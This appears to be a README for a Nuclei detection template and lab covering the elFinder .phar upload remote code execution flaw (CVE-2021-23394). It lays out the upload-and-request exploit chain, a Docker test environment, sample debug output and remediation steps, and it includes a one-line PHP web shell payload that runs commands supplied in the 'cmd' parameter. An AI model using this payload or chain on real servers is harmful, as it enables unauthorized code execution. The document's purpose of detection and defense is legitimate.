# CVE-2021-23394 - elFinder Remote Code Execution via .phar Upload

## Vulnerability Overview

| Attribute | Value |
|-----------|-------|
| **CVE ID** | CVE-2021-23394 |
| **Product** | studio-42/elFinder |
| **Affected Versions** | < 2.1.58 |
| **Severity** | Critical (CVSS 8.1) |
| **Type** | Remote Code Execution (RCE) |
| **Attack Vector** | Network |
| **Authentication** | None required |
| **KEV** | Yes |

## Description

elFinder before version 2.1.58 is vulnerable to remote code execution through `.phar` file upload. The vulnerability exists because `.phar` files were not included in the `staticMimeMap` as PHP executable files. This allows attackers to bypass upload restrictions and execute arbitrary PHP code when the server is configured to parse `.phar` files as PHP (common default configuration in Apache).

## Root Cause

The `elFinderVolumeDriver.class.php` file did not map `.phar` extension to `text/x-php` MIME type in the `staticMimeMap` array, allowing `.phar` files to bypass PHP upload restrictions.

**Fix Commit:** [75ea92d](https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1)

```php
// Added in 2.1.58:
'phar:*' => 'text/x-php'
```

## Exploitation

### Prerequisites

1. elFinder version < 2.1.58
2. Web server configured to execute `.phar` files as PHP (Apache default)
3. Network access to elFinder connector

### Exploit Chain

```
Step 1: Upload malicious .phar file
   POST /elFinder/php/connector.minimal.php
   cmd=upload&target=l1_Lw
   File: exploit.phar (contains PHP code)

Step 2: Verify upload success
   Response contains: {"added":[{"hash":"l1_XXXX","name":"exploit.phar"}]}

Step 3: Trigger RCE
   GET /elFinder/files/exploit.phar
   Response: PHP code executes, output returned
```

## Files Included

| File | Description | Lines |
|------|-------------|-------|
| `cve-2021-23394.yaml` | Nuclei detection template | ~145 |
| `gen_phar.php` | PHAR payload generator | ~95 |
| `run_local_test.sh` | Automated exploit script | ~140 |
| `Dockerfile` | Vulnerable environment | ~70 |
| `docker-compose.yml` | Easy deployment | ~35 |
| `README.md` | This documentation | ~200 |
| `nuclei_debug_output.txt` | Sample debug output | ~50 |

**Total:** ~735 lines across 7 files

## Quick Start

### 1. Start Vulnerable Environment

```bash
# Using Docker Compose
docker-compose up -d

# Or build manually
docker build -t elfinder-vuln .
docker run -p 8080:80 elfinder-vuln
```

### 2. Verify Environment

```bash
# Check elFinder is running
curl http://localhost:8080/elFinder/php/connector.minimal.php?cmd=info
```

### 3. Run Nuclei Test

```bash
# With debug output
nuclei -t cve-2021-23394.yaml -u http://localhost:8080 -debug -v

# Save debug output
nuclei -t cve-2021-23394.yaml -u http://localhost:8080 -debug -v 2>&1 | tee nuclei_debug_output.txt
```

### 4. Manual Exploitation

```bash
# Run automated test script
chmod +x run_local_test.sh
./run_local_test.sh http://localhost:8080
```

## Nuclei Template Usage

```bash
# Basic scan
nuclei -t cve-2021-23394.yaml -u http://target.com

# With debug output (required for bounty submission)
nuclei -t cve-2021-23394.yaml -u http://target.com -debug -v

# Scan multiple targets
nuclei -t cve-2021-23394.yaml -l targets.txt
```

## Expected Debug Output

When running against a vulnerable target, you should see:

```
[INF] Running cve-2021-23394 on http://localhost:8080
[DBG] [cve-2021-23394] Sending request 1/2
[DBG] [cve-2021-23394] Request:
POST /elFinder/php/connector.minimal.php HTTP/1.1
Host: localhost:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...

------WebKitFormBoundary...
Content-Disposition: form-data; name="cmd"
upload
...

[DBG] [cve-2021-23394] Response:
{"added":[{"hash":"l1_ZXhwbG9pdF9...","name":"exploit_abc123.phar"...}]}

[DBG] [cve-2021-23394] Sending request 2/2
[DBG] [cve-2021-23394] Request:
GET /elFinder/files/exploit_abc123.phar HTTP/1.1

[DBG] [cve-2021-23394] Response:
NUCLEI_RCE_abc123def456...

[CVE-2021-23394] [critical] http://localhost:8080
```

## PHAR Payload Generator

```bash
# Generate payload (requires PHP with phar.readonly=0)
php -d phar.readonly=0 gen_phar.php exploit.phar MY_MARKER

# Or use simple PHP payload
echo '<?php echo "PWNED"; system($_GET["cmd"]); ?>' > exploit.phar
```

## Remediation

1. **Update elFinder** to version 2.1.58 or later
2. **Add custom MIME mapping** (if update not possible):
   ```php
   'additionalMimeMap' => ['phar' => 'text/x-php']
   ```
3. **Disable .phar execution** in web server:
   ```apache
   # Apache
   <FilesMatch "\.phar$">
       SetHandler none
   </FilesMatch>
   ```
4. **Restrict elFinder access** with authentication

## References

- [GitHub Issue #3295](https://github.com/Studio-42/elFinder/issues/3295)
- [GitHub Advisory GHSA-qm58-cvvm-c5qr](https://github.com/advisories/GHSA-qm58-cvvm-c5qr)
- [SonarSource Blog](https://blog.sonarsource.com/elfinder-case-study-of-web-file-manager-vulnerabilities)
- [NVD CVE-2021-23394](https://nvd.nist.gov/vuln/detail/CVE-2021-23394)
- [Fix Commit 75ea92d](https://github.com/Studio-42/elFinder/commit/75ea92decc16a5daf7f618f85dc621d1b534b5e1)

## Bounty Submission

To submit for the $100 bounty:

1. **Template file:** `cve-2021-23394.yaml`
2. **Debug output:** Run with `-debug` flag, save output
3. **Vulnerable environment:** Include Docker files or send to `templates@projectdiscovery.io`
4. **PR to:** https://github.com/projectdiscovery/nuclei-templates

## Author

**princechaddha**

## License

MIT License
